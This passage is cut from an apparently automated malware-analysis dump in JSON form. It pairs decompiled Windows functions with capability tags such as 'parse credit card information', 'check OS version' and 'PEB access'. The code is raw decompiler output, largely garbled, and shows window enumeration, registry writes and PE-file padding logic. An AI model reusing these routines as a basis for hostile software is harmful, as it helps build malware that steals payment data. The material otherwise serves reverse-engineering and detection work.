0x43d1773a) = *(puVar12 + 0x43d1773a) ^ 0x6a27e95e;\n    arg_10h = unaff_EBP + 1;\n    pcVar11 = iVar10 + 0x19;\n    *pcVar11 = *pcVar11 + (extraout_CH_00 | *(uVar21 + (uVar15 == false) + 0x7c8ecadd));\n    fcn.004017d0(0x424454, in_stack_ffffffb8, uVar22, arg_14h);\n    fcn.004017d0(0x424454, 0x18, 0x4245dc, 0xc);\n    fcn.004017d0(0x424454, 0x18, 0x4245e8, 0xe);\n    uVar23 = puVar12 & 0xffff0000 | puVar12 + 1;\n    bVar17 = uVar23 < 0x222c;\n    bVar16 = (POPCOUNT(uVar23 - 0x222c & 0xff) & 1U) == 0;\n    arg_14h_00 = 0x11;\n    uVar25 = 0x4245f8;\n    uVar22 = 0x18;\n    fcn.004017d0(0x424454, 0x18, 0x4245f8, 0x11);\n    if ((!bVar16) && (bVar16)) {\n        puVar2 = segment(uVar14, *0x10 + -0x2c);\n        if (bVar17) {\n            *(puVar12 + 0x42) = *(puVar12 + 0x42) & *puVar2 + 'h' + bVar17;\n            bVar17 = CARRY1(*0xb7bc9ebd, extraout_CH_01);\n            bVar20 = SCARRY1(*0xb7bc9ebd, extraout_CH_01);\n            *0xb7bc9ebd = *0xb7bc9ebd + extraout_CH_01;\n            bVar16 = *0xb7bc9ebd == 0;\n            goto code_r0x004020d7;\n        }\n        if (bVar16) {\n            *0xb7bc9ea5 = in_FPUControlWord;\n            *0xb7bc9ea9 = in_FPUStatusWord;\n            *0xb7bc9ead = in_FPUTagWord;\n            *0xb7bc9eb1 = in_FPUInstructionPointer;\n            *0xb7bc9eb7 = in_FPULastInstructionOpcode;\n            *0xb7bc9eb9 = in_FPUDataPointer;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar23 = 0x13;\n    uVar24 = 0x42460c;\n    arg_ch = 0x18;\n    while( true ) {\n        ppuVar9 = fcn.004017d0(0x424454, arg_ch, uVar24, uVar23);\n        bVar17 = ppuVar13 < ppuVar9;\n        bVar20 = SBORROW4(ppuVar13, ppuVar9);\n        bVar16 = ppuVar13 == ppuVar9;\n        arg_14h_00 = 0x14;\n        uVar25 = 0x424620;\n        uVar22 = 0x18;\ncode_r0x004020d7:\n        arg_ch = 0x424454;\n        uVar23 = 0x4020e1;\n        fcn.004017d0(0x424454, uVar22, uVar25, arg_14h_00);\n        if ((bVar17 || bVar16) || (uVar23 = uVar23 & 0xffff | puVar12 << 0x10,  !bVar17 && !bVar16)) break;\n        if (!bVar20) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(extraout_EDX_01 + 0x19) = *(extraout_EDX_01 + 0x19) + extraout_CH_02;\n    }\n    fcn.004017d0(0x424454, 0x18, 0x424634, 0x33);\n    bVar17 = true;\n    uVar24 = 0x424454;\n    uVar23 = 0x40213d;\n    uVar21 = fcn.004017d0(0x424454, 0x18, 0x424668, 10);\n    pcVar11 = uVar21 >> 0x20;\n    uVar22 = uVar21;\n    if ((bVar17) || (uVar23 = uVar23 & 0xffff | puVar12 << 0x10,  !bVar17)) {\n        uVar23 = 4;\n        arg_10h = 0x424674;\n        uVar24 = 0x18;\n    }\n    else {\n        out(*puVar12, uVar21 >> 0x20);\n        do {\n            cVar18 = uVar22 >> 8;\n            in_AF = 9 < (uVar22 & 0xf) | in_AF;\n            uVar22 = CONCAT31(CONCAT21(uVar22 >> 0x10, cVar18 - in_AF), -in_AF);\n        } while (in_AF || cVar18 == *pcVar11);\n        piVar1 = ppuVar13 + pcVar11 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX_01 + 0x6a) = uVar22;\n        if (-in_AF == -0x68) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    pcVar11[0x19] = pcVar11[0x19] + (extraout_ECX_01 >> 8);\n    fcn.004017d0(0x424454, uVar24, arg_10h, uVar23);\n    cVar19 = '\\0';\n    uVar3 = extraout_DL_00 & puVar12;\n    cVar18 = uVar3 < '\\0';\n    bVar17 = uVar3 == 0;\n    uVar23 = 0x4021a6;\n    iVar10 = fcn.004017d0(0x424454, 0x18, \"44\\aaU\", 5);\n    if ((bVar17 || cVar19 != cVar18) || (!bVar17 && cVar19 == cVar18)) {\n        uVar23 = 6;\n    }\n    else {\n        *(iVar10 + 0x6a39da56) = *(iVar10 + 0x6a39da56) ^ extraout_CL_00;\n        uVar23 = uVar23 & 0xffff0000 | in_ES;\n    }\n    fcn.004017d0(0x424454, 0x18, 0x424680, uVar23);\n    fcn.004017d0(0x424454, 0x18, 0x4246b4, 0x2a);\n    fcn.004017d0(0x424454, 0x18, 0x4246e0, 0xb);\n    return;\n}\n",
        "token_count": 3850
    },
    "00403130": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403130(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, *0x10 + -8);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x424830);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x4030b0, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 377
    },
    "00401950": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a1b) overlaps instruction at (ram,0x00401a18)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401950(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t *in_EAX;\n    uint8_t uVar5;\n    int32_t *in_ECX;\n    int32_t *piVar4;\n    int32_t *in_EDX;\n    uint8_t uVar6;\n    int32_t *unaff_EBX;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    bool bVar7;\n    uint8_t in_AF;\n    unkbyte10 in_ST0;\n    \n    uVar5 = in_ECX;\n    uVar6 = unaff_EBX;\n    piVar4 = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - uVar6, uVar5);\n    *arg_8h = 0x5b;\n    if ((in_EDX < piVar4) && (piVar4 <= in_EDX)) {\n        in_EAX = in_EAX & 0xe2f4cc58;\n    }\n    arg_8h[1] = 0xe0;\n    arg_8h[2] = 0x62;\n    if ((uVar5 < '\\x01') || ('\\0' < uVar5)) {\n        arg_8h[3] = 0x96;\n        piVar4 = in_EAX;\n    }\n    else {\n        *(in_EAX + -0x1f3a4905) = in_ST0;\n        uVar2 = in_EAX + -1;\n        uVar1 = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + uVar1 * '\\x06';\n        uVar2 = uVar2 + (0x90 < (uVar2 & 0xf0) | uVar5 < in_EDX | uVar1 * (0xf9 < uVar2)) * '`';\n        in_EAX = in_EAX + -1 & 0xffffff00 | uVar2;\n        *in_EDX = *in_EDX + 0x46c6df84;\n        in_EDX = in_EDX + *(arg_8h + 0x7cbda950);\n        *in_EAX = *in_EAX + uVar2;\n        piVar4 = unaff_EBX;\n    }\n    uVar3 = CONCAT11(((in_EAX >> 8) - uVar6) + 'M', in_EAX) & 0x26ae;\n    arg_8h[4] = 0xfd;\n    if ((uVar3 != 0) && (uVar3 == 0)) {\n        in_SS = unaff_EDI;\n        arg_8h = arg_8h + -1;\n        *(unaff_EDI | &stack0xfffffffc) = piVar4;\n        in_EDX = in_EDX & 0xffffff00;\n    }\n    arg_8h[5] = 0x32;\ncode_r0x00401a00:\n    piVar4 = in_ECX;\n    arg_8h[6] = 5;\n    in_ECX = in_EDX;\n    do {\n        arg_8h[7] = 0x28;\n        in_ECX = in_ECX & 0xffff | piVar4 << 0x10;\n        uVar5 = piVar4 >> 8 ^ uVar6;\n        bVar7 = (POPCOUNT(uVar5) & 1U) == 0;\n        arg_8h[8] = 0x17;\n        if ((uVar5 != 0) && (uVar5 == 0)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        arg_8h[9] = 0xb5;\n        if ((!bVar7) && (bVar7)) {\n            segment(in_SS, *0x10 + -0x10);\n            if (bVar7) goto code_r0x00401a00;\n            in_ECX = 0xb7bc9ea5;\n        }\n        arg_8h[10] = 0x49;\n        uVar5 = (piVar4 << 0x10) >> 0x18 ^ uVar6;\n        bVar7 = uVar5 << 8 < 0;\n        arg_8h[0xb] = 0x39;\n        if ((uVar5 == 0 || bVar7) || (uVar5 != 0 && !bVar7)) {\n            arg_8h[0xc] = 0x8f;\n            *arg_ch = 0xd;\n            return;\n        }\n        in_EDX = unaff_EBX;\n        if (piVar4 != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 1152
    },
    "00402250": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402382) overlaps instruction at (ram,0x00402381)\n// \n\nulong fcn.00402250(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t extraout_CH;\n    uint32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t extraout_DL;\n    uint32_t extraout_EDX;\n    int32_t iVar4;\n    int32_t extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint8_t unaff_BL;\n    uint *unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t arg_ch;\n    bool bVar5;\n    ulong uVar6;\n    uint unaff_retaddr;\n    char *pcVar7;\n    int32_t arg_14h;\n    uint *puVar8;\n    int32_t iVar9;\n    \n    iVar9 = unaff_ESI;\n    fcn.004017d0(0x424454, 0x18, 0x42446c, 0x11);\n    fcn.004017d0(0x424454, 0x18, 0x424688, 0xf);\n    bVar5 = (extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - unaff_BL, extraout_ECX)) < extraout_EDX;\n    iVar2 = unaff_ESI;\n    puVar8 = unaff_EBP;\n    uVar6 = fcn.004017d0(0x424454, 0x18, 0x424698, 0x1a);\n    iVar4 = uVar6 >> 0x20;\n    if ((bVar5) || (arg_14h = iVar4,  !bVar5)) {\n        arg_14h = 10;\n        puVar8 = 0x4246ec;\n        iVar2 = 0x18;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    arg_ch = unaff_ESI + 1;\n    pcVar7 = iVar4 + 0x19;\n    *pcVar7 = *pcVar7 + (extraout_CH | *(uVar6 + (bVar5 == false) + 0x7c8ecaf9));\n    fcn.004017d0(0x424454, iVar2, puVar8, arg_14h);\n    fcn.004017d0(0x424454, 0x18, 0x4246f8, 0xb);\n    pcVar7 = unaff_EBP;\n    fcn.004017d0(0x424454, 0x18, str.e_Y_, 8);\n    iVar2 = fcn.004017d0(0x424454, 0x18, 0x42470c, 9);\n    bVar5 = (POPCOUNT(iVar2 + 1U & 0xff) & 1U) == 0;\n    fcn.004017d0(0x424454, 0x18, str.XoXbw, 9);\n    if ((bVar5) || (uVar3 = extraout_ECX_00,  !bVar5)) {\n        uVar3 = 9;\n        pcVar7 = str._Znw;\n        arg_ch = 0x18;\n    }\n    *(extraout_EDX_00 + 9) = *(extraout_EDX_00 + 9) + -0x68;\n    *(extraout_EDX_00 + 0x19) = *(extraout_EDX_00 + 0x19) + (extraout_ECX_00 >> 8);\n    fcn.004017d0(0x424454, arg_ch, pcVar7, uVar3);\n    fcn.004017d0(0x424454, 0x18, 0x424730, 0xc);\n    fcn.004017d0(0x424454, 0x18, 0x42473c, 3);\n    fcn.004017d0(0x424454, 0x18, str.M_2._B, 10);\n    fcn.004017d0(0x424454, 0x18, 0x42474c, 0x40);\n    bVar5 = false;\n    puVar8 = 0x424454;\n    fcn.004017d0(0x424454, 0x18, str.5e0, 0xc);\n    if ((!bVar5) && (bVar5)) {\n        *puVar8 = unaff_retaddr;\n        return CONCAT44(iVar9, unaff_retaddr);\n    }\n    fcn.004017d0(0x424454, 0x18, 0x424798, 0xb);\n    fcn.004017d0(0x424454, 0x18, 0x4247a4, 4);\n    fcn.004017d0(0x424454, 0x18, 0x4247a8, 4);\n    fcn.004017d0(0x424454, 0x18, str.K8F_8, 0xc);\n    fcn.004017d0(0x424454, 0x18, 0x4247b8, 4);\n    bVar5 = (POPCOUNT(extraout_DL & unaff_BL) & 1U) == 0;\n    fcn.004017d0(0x424454, 0x18, 0x4247bc, 9);\n    if ((!bVar5) && (bVar5)) {\n        puVar8 = &stack0xffffffe0;\n        cVar1 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return CONCAT44(extraout_EDX_01, uVar3);\n    }\n    fcn.004017d0(0x424454, 0x18, 0x4247c8, 0x16);\n    uVar6 = fcn.004017d0(0x424454, 0x18, 0x4247e0, 7);\n    return uVar6;\n}\n",
        "token_count": 1497
    },
    "004039d0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403a87) overlaps instruction at (ram,0x00403a85)\n// \n// WARNING: Removing unreachable block (ram,0x00403b53)\n\nuchar * __cdecl fcn.004039d0(uint16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar3;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX;\n    uint32_t uVar2;\n    int32_t *in_EDX;\n    uint32_t unaff_EBX;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t unaff_ESI;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint32_t unaff_EDI;\n    bool bVar9;\n    uint32_t uStack21406;\n    uint *apuStack21402 [5337];\n    uchar *puStack52;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    puVar6 = &stack0xfffffffc;\n    if (*arg_8h != 0x5a4d) {\n        return NULL;\n    }\n    if ((*arg_8h < 0x5a4d) || (*arg_8h >= 0x5a4d)) {\n        in_ECX = *(arg_8h + 0x1e) + arg_8h;\n        puStack28 = unaff_ESI & 0xffff | unaff_EBX << 0x10;\n    }\n    else {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n        puVar5 = &stack0xffffffe4;\n        puVar6 = &stack0xffffffe4;\n        puStack28 = &stack0xfffffffc;\n        cVar3 = '\\x05';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar8;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n        puStack52 = &stack0xffffffe4;\n        uStack21406 = unaff_ESI;\n    }\n    if (*in_ECX != 0x4550) {\n        return NULL;\n    }\n    if (in_ECX[0x16] != 0) {\n        return NULL;\n    }\n    puVar6[-1] = 0x40;\n    cVar3 = (in_ECX >> 8) + -1;\n    if ((cVar3 < '\\x05') || ('\\x04' < cVar3)) {\n        iVar1 = puVar6[2];\n        uVar2 = *(iVar1 + 0x3c);\n        if (0x80 < uVar2) {\n            if ((0x80 < uVar2) && (uVar2 < 0x81)) {\n                iVar1 = apuStack21402[0];\n            }\n            if (*(iVar1 + 0x3c) < 0xc0) {\n                unaff_EDI = *(iVar1 + 0x3c) - 0x80;\n                puVar6[-1] = unaff_EDI;\n            }\n            else {\n                unaff_EDI = puVar6[-1];\n            }\n            apuStack21402[0] = unaff_EDI;\n            in_EDX = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n            in_ECX = extraout_ECX;\n            piVar4 = in_EDX;\n            goto code_r0x00403ac9;\n        }\n    }\n    else {\n        piVar4 = unaff_EBX & 0xffff0000 | uStack21406 >> 0x10;\n        if (in_EDX + 0x7ef7ba75 < 0) {\ncode_r0x00403ac9:\n            iVar1 = *in_EDX;\n            *(piVar4 + 0x13120f6) = *(piVar4 + 0x13120f6) + in_ECX;\n            puVar6[-2] = piVar4;\n            if (piVar4 != NULL) {\n                bVar9 = unaff_EDI == 0;\n                apuStack21402[0] = puVar6;\n                uVar2 = 0;\n                if (!bVar9) {\n                    do {\n                        puVar6 = apuStack21402[0];\n                        if ((!bVar9) && (bVar9)) {\n                            puVar8 = &stack0xffffac66;\n                            puVar6 = &stack0xffffac66;\n                            cVar3 = '\\x10';\n                            do {\n                                apuStack21402[0] = apuStack21402[0] + -1;\n                                puVar8 = puVar8 + -1;\n                                *puVar8 = *apuStack21402[0];\n                                cVar3 = cVar3 + -1;\n                            } while ('\\0' < cVar3);\n                        }\n                        apuStack21402[0] = 0x403b05;\n                        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n                        uVar7 = uVar2 + 1;\n                        bVar9 = uVar7 == unaff_EDI;\n                        *(uVar2 + piVar4) = iVar1 % 0xff;\n                        apuStack21402[0] = puVar6;\n                        uVar2 = uVar7;\n                    } while (uVar7 < unaff_EDI);\n                }\n                uVar2 = puVar6[-1];\n                apuStack21402[0] = puVar6[-2];\n                puVar8 = apuStack21402[0];\n                puVar6 = puVar6[2] + 0x80;\n                for (uVar7 = uVar2 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                    *puVar6 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar6 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n                return 0x1;\n            }\n            return in_EDX + iVar1 + 1;\n        }\n        *in_EDX = *in_EDX;\n        *(unaff_EDI + 9) = *(unaff_EDI + 9);\n    }\n    return NULL;\n}\n",
        "token_count": 1557
    },
    "00404880": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404880(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x4244e8, arg_8h);\n    (*pcVar2)(&var_268h, 0x424500, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_38h = 0x424528;\n    var_34h = 0x424534;\n    var_30h = 0x424540;\n    var_2ch = 0x424550;\n    var_28h = 0x424558;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_20h = ~uVar4 - 1;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1117
    },
    "00401ae0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ae0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401950(&var_68h, &var_4h);\n    fcn.00401860(&var_68h, var_4h, 0x407014, 0xa440);\n    *arg_8h = 0x407014;\n    *arg_ch = 0xa440;\n    return;\n}\n",
        "token_count": 236
    },
    "00402820": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00402820(void)\n\n{\n    uint uVar1;\n    \n    if (*0x424908 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x424908 = 1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00403870": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403870(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00402b10": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.00402b10(int32_t s1)\n\n{\n    int32_t iVar1;\n    int32_t extraout_EDX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *unaff_EDI;\n    uint32_t uVar4;\n    bool bVar5;\n    bool bVar6;\n    int32_t iStack40;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    iStack40 = s1;\n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    bVar5 = 0xfffffffb < &iStack40;\n    bVar6 = SCARRY4(&iStack40, 4);\n    iVar2 = s1;\n    if ((!bVar5) && (bVar5)) {\n        piVar3 = s1 + 0x69 + extraout_EDX * 4;\n        iVar2 = s1 + *piVar3;\n        bVar6 = SCARRY4(s1, *piVar3) != SCARRY4(iVar2, bVar5);\n        iVar2 = iVar2 + bVar5;\n    }\n    var_14h = 0x42489c;\n    var_10h = 0x424894;\n    var_ch = 0x4248a4;\n    var_8h = str._a6_nb_;\n    var_4h = 0x4248b4;\n    if ((!bVar6) && (bVar6)) {\n        *unaff_EDI = 0x4248b4;\n        return 0x4248a4004248b4;\n    }\n    uVar4 = 0;\n    piVar3 = &var_14h;\n    do {\n        iStack40 = *piVar3;\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(iVar2);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        uVar4 = uVar4 + 1;\n        piVar3 = piVar3 + 1;\n    } while (uVar4 < 5);\n    iStack40 = 0x42488c;\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(s1);\n    return iVar2 == 0;\n}\n",
        "token_count": 525
    },
    "00403460": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nunkint6 fcn.00403460(void)\n\n{\n    uint16_t extraout_DX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT24(extraout_DX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT24(extraout_DX, 1);\n    }\n    return extraout_DX << 0x20;\n}\n",
        "token_count": 147
    },
    "004044e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004044e0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403ff0(0x80000002, 0x424634, 0x424680, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00402a10": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00402a10(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4248bc, 0x4248e4, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 320
    },
    "00404a40": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404a40(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42492c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        